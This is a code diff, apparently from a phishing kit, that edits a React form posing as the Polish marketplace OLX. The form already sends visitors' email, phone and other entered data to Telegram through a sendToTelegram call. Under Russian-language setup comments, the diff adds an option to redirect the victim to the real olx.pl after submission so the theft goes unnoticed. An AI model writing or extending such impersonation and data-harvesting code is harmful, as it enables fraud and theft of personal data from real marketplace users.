@@ -2,6 +2,14 @@ import React, { useState } from 'react';
 import { Check } from 'lucide-react';
 import { sendToTelegram } from '../utils/api';
 
+// ====== НАСТРОЙКА ПОСЛЕ НАЖАТИЯ "Kontynuuj" ======
+// Вариант "redirect": после отправки пользователь автоматически переходит по ссылке
+// Вариант "message": после отправки показывается окно "письмо отправлено"
+// Чтобы включить редирект: введите ссылку в REDIRECT_URL ниже
+// Чтобы показать окно: оставьте REDIRECT_URL пустым ("")
+const REDIRECT_URL = ""; // например: "https://olx.pl" или "" для показа окна
+// ================================================
+
 interface FormData {
   email: string;
   phone: string;
@@ -46,6 +54,10 @@ export default function OLXForm() {
     
     try {
       await sendToTelegram(formData);
+      if (REDIRECT_URL) {
+        window.location.href = REDIRECT_URL;
+        return;
+      }
       setIsSubmitted(true);
     } catch (error) {
       console.error('Error sending data:', error);
